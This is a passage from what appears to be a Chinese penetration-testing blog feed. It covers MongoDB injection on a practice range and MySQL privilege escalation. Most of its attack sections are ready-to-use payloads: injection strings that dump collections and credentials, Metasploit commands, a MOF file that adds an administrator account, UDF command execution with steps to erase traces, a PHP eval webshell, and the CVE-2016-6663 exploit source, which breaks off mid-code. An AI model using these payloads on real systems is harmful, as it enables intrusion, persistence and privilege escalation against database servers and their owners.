href="https://www.mozhe.cn/">https://www.mozhe.cn/</a></p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619698551399.png" alt="1619698551399"></p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619698563509.png" alt="1619698563509"></p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619698683292.png" alt="1619698683292"></p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619698696446.png" alt="1619698696446"></p><p>1.单引号%27测试到注入点</p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619698729160.png" alt="1619698729160"></p><p>构造简单的链接测试回显</p><pre class="line-numbers language-none"><code class="language-none">/new_list.php?id=1'}); return ({title:1,content:'2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619698908561.png" alt="1619698908561"></p><p>爆库</p><pre class="line-numbers language-none"><code class="language-none">/new_list.php?id=1'}); return ({title:tojson(db),content:'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619699059432.png" alt="1619699059432"></p><pre class="line-numbers language-none"><code class="language-none">mozhe_cms_Authority<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆表</p><pre class="line-numbers language-none"><code class="language-none">/new_list.php?id=1'}); return ({title:tojson(db.getCollectionNames()),content:'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>db.getCollectionNames()返回的是数组，需要用to json转换为字符串</p><p><strong>并且MongoDB数据库区分大小写</strong></p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619699101231.png" alt="1619699101231"></p><p>爆字段</p><pre class="line-numbers language-none"><code class="language-none">/new_list.php?id=1'}); return ({title:tojson(db.Authority_confidential.find()[0]),content:'1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>是当前用的集合，find用于查找，0是第一条数据</p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619699164607.png" alt="1619699164607"></p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619699181276.png" alt="1619699181276"></p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619700092357.png" alt="1619700092357"></p><p>说明只有两个表</p><p>然后它的密码是md5加密的 去破解就好了</p><p>贴个链接</p><p> <a href="https://www.cmd5.com/">www.cmd5.com</a> </p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619700202476.png" alt="1619700202476"></p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619700225858.png" alt="1619700225858"></p><p>进行登录</p><pre class="line-numbers language-none"><code class="language-none">mozhe610254<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619702487926.png" alt="1619702487926"></p><p>这里要讲一下</p><p>mongodb的认证(authentication)与授权(authorization)</p><p>连接Mongodb的时候，除了需要用户名，密码，还需要指定这个用户的认证db</p><p>为什么需要指定这个认证db？</p><p>是因为Mongodb允许存在多个同名的用户存在，但同名的用户认证db必须不能相同，如下： </p><pre class="line-numbers language-none"><code class="language-none">mongo --host 219.153.49.228 -u "mozhe" --authenticationDatabase "mozhe" -p'610254'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="MSF渗透MongoDB"><a href="#MSF渗透MongoDB" class="headerlink" title="MSF渗透MongoDB"></a>MSF渗透MongoDB</h2><h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><p>MongDB默认端口是27017，当配置无验证时，存在未授权访问</p><p>进行验证</p><p>扫描对端或者网段有没有开启27017端口</p><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619703576348.png" alt="1619703576348"></p><p>就是这一条</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary/scanner/mongodb/mongodb_loginset rhosts 192.168.175.0/24set threads 10exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619704557151.png" alt="1619704557151"></p><h3 id="exp利用"><a href="#exp利用" class="headerlink" title="exp利用"></a>exp利用</h3><p>但是这里拿不到shell 也算是验证</p><pre class="line-numbers language-none"><code class="language-none">use exploit/linux/misc/mongod_native_helperset rhosts 192.168.175.166exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="C:\Users\12550\AppData\Roaming\Typora\typora-user-images\1619704731351.png" alt="1619704731351"></p><h2 id="自动化评估"><a href="#自动化评估" class="headerlink" title="自动化评估"></a>自动化评估</h2>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql提权小结</title>
      <link href="/2021/10/28/mysql-ti-quan-xiao-jie/"/>
      <url>/2021/10/28/mysql-ti-quan-xiao-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总结一下Mysql提权的姿势</p><h2 id="MySql提权方式"><a href="#MySql提权方式" class="headerlink" title="MySql提权方式"></a>MySql提权方式</h2><pre class="line-numbers language-none"><code class="language-none">1. mof2. udf3. CVE-2016-6663 &amp;&amp; CVE-2016-6664<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>mof是windows系统的一个文件</p><p>默认在电脑目录:<code>c:/windows/system32/wbem/mof/nullevt.mof</code>叫做”托管对象格式”</p><p>作用是每隔五秒就会去监控进程创建和死亡</p><p>mysql是root权限，然后使用root权限去执行我们上传的mof</p><p>隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令</p><h3 id="MOF文件解析"><a href="#MOF文件解析" class="headerlink" title="MOF文件解析"></a>MOF文件解析</h3><p>Windows管理规范(WMI)提供了如下三种方法编译WMI存储库的托管对象格式（MOF）文件：</p><ul><li>将MOF文件执行为命令行参数及<code>Mofcomp.exe</code>文件</li><li>使用<code>IMofCompiler</code>接口和<code>$CompileFile</code>方法</li><li>拖放到<code>%SystemRoot%\System32\Wbem\MOF</code>文件夹下的MOF文件中</li></ul><p>注意:</p><ul><li>使用MOF提权的前提是当前root账户可以复制文件到 %SystemRoot%\System32\Wbem\MOF目录下。</li><li>Microsoft 建议您到存储库编译 MOF 文件使用前两种方法。也就是运行 Mofcomp.exe 文件，或使用 IMofCompiler::CompileFile 方法。第三种方法仅为向后兼容性与早期版本（win2003）的 WMI 提供，并因为此功能可能不会提供在将来的版本后，不应使用。</li></ul><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><ul><li><p>将以下代码保存为<code>nullevt.mof</code>文件</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">namespace</span><span class="token punctuation">(</span></span><span class="token string">"\\.\root\subscription"</span><span class="token expression"><span class="token punctuation">)</span></span></span>instance of __EventFilter as $EventFilter<span class="token punctuation">{</span>EventNamespace <span class="token operator">=</span> <span class="token string">"Root\\Cimv2"</span><span class="token punctuation">;</span>Name  <span class="token operator">=</span> <span class="token string">"filtP2"</span><span class="token punctuation">;</span>Query <span class="token operator">=</span> <span class="token string">"Select * From __InstanceModificationEvent "</span><span class="token string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span><span class="token string">"And TargetInstance.Second = 5"</span><span class="token punctuation">;</span>QueryLanguage <span class="token operator">=</span> <span class="token string">"WQL"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>instance of ActiveScriptEventConsumer as $Consumer<span class="token punctuation">{</span>Name <span class="token operator">=</span> <span class="token string">"consPCSV2"</span><span class="token punctuation">;</span>ScriptingEngine <span class="token operator">=</span> <span class="token string">"JScript"</span><span class="token punctuation">;</span>ScriptText <span class="token operator">=</span><span class="token string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add\")"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>instance of __FilterToConsumerBinding<span class="token punctuation">{</span>Consumer   <span class="token operator">=</span> $Consumer<span class="token punctuation">;</span>Filter <span class="token operator">=</span> $EventFilter<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>找个可写目录，上传或新建mof文件</p><ul><li>通过MySQL查询将文件导入</li></ul></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">select <span class="token function">load_file</span><span class="token punctuation">(</span><span class="token string">'C:\\www\\nullevt.mof'</span><span class="token punctuation">)</span> into dumpfile <span class="token string">'c:/windows/system32/wbem/mof/nullevt.mof'</span><span class="token punctuation">;</span>注意这里C<span class="token operator">:</span>\\www\\nullevt<span class="token punctuation">.</span>mof是你上传mof文件的随意路径，但后面的那个路径是固定的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>导入后，系统会自动不停的运行该文件。</p><p>解决办法：</p><ul><li>第一 <code>net stop winmgmt</code> 停止服务，</li><li>第二 删除文件夹：<code>C:\WINDOWS\system32\wbem\Repository\</code></li><li>第三 <code>net start winmgmt</code> 启动服务</li></ul><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用</p><p>udf在mysql5.1以后的版本中，存在于<code>mysql/lib/plugin</code>目录下，文件后缀为<code>.dll</code>，常用c语言编写</p><p>它有3种返回值，这三种分别是</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">STRING        字符型INTEGER       整型REAL          实数型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>在拿到webshell后，在网站根目录下的<code>config.php</code>里，一般都有mysql的账号密码</p><p>利用root权限，创建带有调用cmd函数的<code>udf.dll</code>(动态链接库)</p><p>当我们把<code>udf.dll</code>导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。</p><p>这样我们自定义的函数才被当作本机函数执行</p><p>在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而实现提权</p><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ul><li><p>MySQL 数据库没有开启安全模式</p></li><li><p>mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的<code>lib\plugin</code>文件夹下</p></li><li><p>mysql版本小于5.1， udf.dll文件在windows server 2003下放置于<code>c:window\ssystem32</code>目录</p></li><li><p>在windows server 2000下放置在<code>c:winnt\system32</code>目录。</p></li><li><p>掌握mysql数据库的账户，从拥有对mysql的<code>insert</code>和<code>delete</code>权限，以创建和抛弃函数。拥有可以将udf.dll写入相应目录的权限。</p></li><li><p>版本大于5.1的udf.dll放到mysql安装目录的<code>lib\plugin</code>文件夹才能创建自定义函数。目录默认是不存在的需要自己创建，在安装目录下创建<code>lib\plugin</code>文件夹，然后将<code>udf.dll</code>导出到这个目录</p></li></ul><h3 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h3><ul><li>如果MySQL在C盘的话，基本上就可以略过UDF提权的办法了</li><li>MySQL的lib下没有plugin这个目录，该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建<code>lib\plugin</code>文件夹，然后将udf.dll文件导出到该目录。直接新建一个然后将dll导入到plugin里,导入方法不限，只要你想办法弄进去就行</li><li>通过<code>show variables like ‘%secure%’;</code> 查看参数当前状态，为空，不能为NULL</li></ul><h3 id="windows下提权："><a href="#windows下提权：" class="headerlink" title="windows下提权："></a>windows下提权：</h3><p><code>udf.dll</code>在<code>sqlmap\data\udf\mysql\windows\32</code>目录下，里面有windows和linux，然后还有32位和64位<br>注意：这里的位数是mysql的位数，并不是对方系统的位数</p><ul><li>查看一下MySQL是32位的还是64位的<pre class="line-numbers language-c" data-language="c"><code class="language-c">mysql <span class="token operator">-</span>Vmysql <span class="token operator">--</span>version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><p><img src="https://img-blog.csdnimg.cn/20201214092658461.png" alt="在这里插入图片描述"><br>所以windows–&gt;32的udf.dll</p><p>而且是个高版本MySQL数据库</p><p>然后我们接下来看看MySQL的文件导出功能有没有开启，这里使用的查看语句是：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">SHOW VARIABLES LIKE <span class="token string">"secure_file_priv"</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20201214091324429.png" alt="在这里插入图片描述"></p><p>获取插件路径</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">select @@basedir<span class="token punctuation">;</span>select @@plugin_dir<span class="token punctuation">;</span>show variables like <span class="token string">'%plugins%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20201214093803474.png" alt="在这里插入图片描述"></p><p>sqlmap内置dll支持的函数</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109081356181.png" alt="image-20210908105343476"></p><p>sqlmap里的udf.dll是通过<code>异或</code>编码的，使用之前一定要记得解码，解码的工具也在sqlmap中，<br>解码的工具就在<code>sqlmap/extra/cloak/cloak.py</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">python cloak<span class="token punctuation">.</span>py <span class="token operator">-</span>d <span class="token operator">-</span>i C<span class="token operator">:</span>\Python27\sqlmap\data\udf\mysql\windows\<span class="token number">32</span>\lib_mysqludf_sys<span class="token punctuation">.</span>dll_<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传之后</p><p>接着就可以使用上传上去的这个dll文件创建一个函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">CREATE FUNCTION sys_exec RETURNS STRING SONAME <span class="token string">'udf.dll'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行查询</p><pre class="line-numbers language-none"><code class="language-none">SELECT sys_exec('cmd','ipconfig');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后删除痕迹</p><pre class="line-numbers language-none"><code class="language-none">drop function sys_exec; delete from mysql.func where name='sys_exec'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="CVE-2016-6663-amp-amp-CVE-2016-6664"><a href="#CVE-2016-6663-amp-amp-CVE-2016-6664" class="headerlink" title="CVE-2016-6663 &amp;&amp; CVE-2016-6664"></a>CVE-2016-6663 &amp;&amp; CVE-2016-6664</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>CVE-2016-6663是条件竞争漏洞，它能够让一个低权限账号（拥有CREATE/INSERT/SELECT权限）提升权限并且以系统用户身份执行任意代码。也就是说，我们可以通过他得到一整个mysql的权限。</p><p>CVE-2016-6664是root权限提升漏洞，这个漏洞可以让拥有MySQL系统用户权限的攻击者提升权限至root，以便进一步攻击整个系统</p><p>导致这个问题的原因其实是因为MySQL对错误日志以及其他文件的处理不够安全，这些文件可以被替换成任意的系统文件，从而被利用来获取root权限</p><p>简单来说，组合拳可以将低权限的www-data权限提升为mysql权限，然后再将mysql提升为root权限</p><h3 id="CVE-2016-6663利用条件"><a href="#CVE-2016-6663利用条件" class="headerlink" title="CVE-2016-6663利用条件"></a>CVE-2016-6663利用条件</h3><ul><li>1.已经getshell，获得www-data权限</li><li>2.获取到一个拥有create,drop,insert,select权限的数据库账号，密码</li><li>3.提权过程需要在交互式的shell环境中运行，所以需要反弹shell再提权</li><li>4.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li></ul><h3 id="CVE-2016-6664利用条件"><a href="#CVE-2016-6664利用条件" class="headerlink" title="CVE-2016-6664利用条件"></a>CVE-2016-6664利用条件</h3><ul><li>1.目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式（通过cat /etc/mysql/conf.d/mysqld_safe_syslog.cnf查看没有包含<code>syslog</code>字样即可）</li><li>2.需要在mysql权限下运行才能利用</li><li>3.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li></ul><h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><p>使用docker搭建</p><pre class="line-numbers language-none"><code class="language-none">sudo docker run -d -P tutum/lamp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109081356697.png" alt="image-20210908113349174"></p><p>然后去底层</p><pre class="line-numbers language-none"><code class="language-none">sudo docker pssudo docker exec -it &lt;container_id&gt; /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109081356717.png" alt="image-20210908113450435"></p><p>安装一些依赖</p><pre class="line-numbers language-none"><code class="language-none">apt update &amp;&amp; apt install -y wget gcc libmysqlclient-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>webshell写入</p><p>注意转义</p><pre class="line-numbers language-none"><code class="language-none">echo "&lt;?php @eval(\$_POST[1]);?&gt;" &gt;  /var/www/html/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加权</p><pre class="line-numbers language-none"><code class="language-none">chmod -R 777 /var/www/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109081356962.png" alt="image-20210908114035168"></p><p>mysql创建用户test</p><pre class="line-numbers language-none"><code class="language-none">mysqlcreate database testdb;CREATE USER 'test'@'%' IDENTIFIED BY '123123'; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109081356775.png" alt="image-20210908114112241"></p><p>授予权限create,drop,insert,select</p><pre class="line-numbers language-none"><code class="language-none">grant create,drop,insert,select on testdb.* to 'test'@'%';flush privileges; #刷新权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109081356236.png" alt="image-20210908114147563"></p><p>重新打包</p><pre class="line-numbers language-none"><code class="language-none">sudo docker commit &lt;container_id&gt; tutum1/lampsudo docker commit 1f4a tutum1/lamp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109081356568.png" alt="image-20210908114746369"></p><p>重新启动</p><pre class="line-numbers language-none"><code class="language-none">sudo docker run -d -p 8080:80 -p 3306:3306 tutum1/lamp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109081502946.png" alt="image-20210908144142195"></p><p>环境搭建就完事了</p><h3 id="蚁剑连接webshell"><a href="#蚁剑连接webshell" class="headerlink" title="蚁剑连接webshell"></a>蚁剑连接webshell</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109081502211.png" alt="image-20210908144221369"></p><h3 id="上传mysql-privesc-race-c文件"><a href="#上传mysql-privesc-race-c文件" class="headerlink" title="上传mysql-privesc-race.c文件"></a>上传<code>mysql-privesc-race.c</code>文件</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;grp.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;mysql.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pwd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/inotify.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">EXP_PATH</span>          <span class="token string">"/data/mysql_privesc_exploit"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">EXP_DIRN</span>          <span class="token string">"mysql_privesc_exploit"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MYSQL_TAB_FILE</span>    <span class="token expression">EXP_PATH </span><span class="token string">"/exploit_table.MYD"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MYSQL_TEMP_FILE</span>   <span class="token expression">EXP_PATH </span><span class="token string">"/exploit_table.TMD"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SUID_SHELL</span>     <span class="token expression">EXP_PATH </span><span class="token string">"/mysql_suid_shell.MYD"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_DELAY</span> <span class="token expression"><span class="token number">1000</span>    </span><span class="token comment">// can be used in the race to adjust the timing if necessary</span></span>MYSQL <span class="token operator">*</span>conn<span class="token punctuation">;</span>  <span class="token comment">// DB handles</span>MYSQL_RES <span class="token operator">*</span>res<span class="token punctuation">;</span>MYSQL_ROW row<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> cnt<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">intro</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span>             <span class="token string">"\033[94m\n"</span>            <span class="token string">"MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n"</span>            <span class="token string">"mysql-privesc-race.c (ver. 1.0)\n\n"</span>            <span class="token string">"CVE-2016-6663 / OCVE-2016-5616\n\n"</span>            <span class="token string">"For testing purposes only. Do no harm.\n\n"</span>            <span class="token string">"Discovered/Coded by:\n\n"</span>            <span class="token string">"Dawid Golunski \n"</span>            <span class="token string">"http://legalhackers.com"</span>            <span class="token string">"\033[0m\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">usage</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>argv0<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">intro</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage:\n\n%s user pass db_host database\n\n"</span><span class="token punctuation">,</span> argv0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">mysql_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>sql_cmd<span class="token punctuation">,</span> <span class="token keyword">int</span> silent<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>silent<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s \n"</span><span class="token punctuation">,</span> sql_cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span>conn<span class="token punctuation">,</span> sql_cmd<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    res <span class="token operator">=</span> <span class="token function">mysql_store_result</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">mysql_free_result</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> randomnum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> io_notified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> myd_handle<span class="token punctuation">;</span>    <span class="token keyword">int</span> wpid<span class="token punctuation">;</span>    <span class="token keyword">int</span> is_shell_suid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">pid_t</span> pid<span class="token punctuation">;</span>    <span class="token keyword">int</span> status<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">stat</span> st<span class="token punctuation">;</span>    <span class="token comment">/* io notify */</span>    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4096</span><span class="token punctuation">]</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> num_read<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">inotify_event</span> <span class="token operator">*</span>event<span class="token punctuation">;</span>    <span class="token comment">/* credentials */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>user     <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>password <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>db_host  <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>database <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// Disable buffering of stdout</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Get the params</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc<span class="token operator">!=</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">usage</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token 